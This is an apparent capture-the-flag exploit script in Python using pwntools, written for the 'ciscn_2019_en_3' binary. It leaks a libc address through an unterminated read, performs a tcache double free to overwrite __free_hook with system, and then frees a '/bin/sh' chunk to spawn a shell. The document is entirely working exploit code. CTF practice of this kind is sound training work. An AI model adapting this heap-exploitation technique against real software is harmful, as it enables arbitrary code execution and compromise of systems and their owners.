from pwn import *
context.log_level = 'debug'

elf = ELF("./ciscn_2019_en_3")
p = elf.process()
libc = ELF("./libc-2.27.so")
#p = remote("")
def dbg():
	gdb.attach(p)
	p.interactive()

def add(size, content):
	p.sendlineafter("choice:", '1')
	p.sendlineafter("of story: \n", str(size))
	p.sendafter("the story: \n", content)	

def free(idx):
	p.sendlineafter("choice:", '4')
	p.sendlineafter("index:\n", str(idx))

def exp():
	p.sendlineafter("name?\n", 'a')
	p.sendafter("ID.\n", 'a'*8)#利用read后面不补0的特性，泄露栈上数据，leak libc
	libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x81237
	log.success("libc_base ==> " + hex(libc_base))
	free_hook = libc_base + libc.sym['__free_hook']
	system = libc_base + libc.sym['system']
	binsh = libc_base + libc.search('/bin/sh').next()
	add(0x20,'a')#0
	add(0x20,'/bin/sh\x00')#1
	free(0)	#double free
	free(0)
	add(0x20, p64(free_hook))
	add(0x20,'a')
	add(0x20, p64(system))
	free(1)
	p.interactive()
if __name__ == '__main__':
	exp()
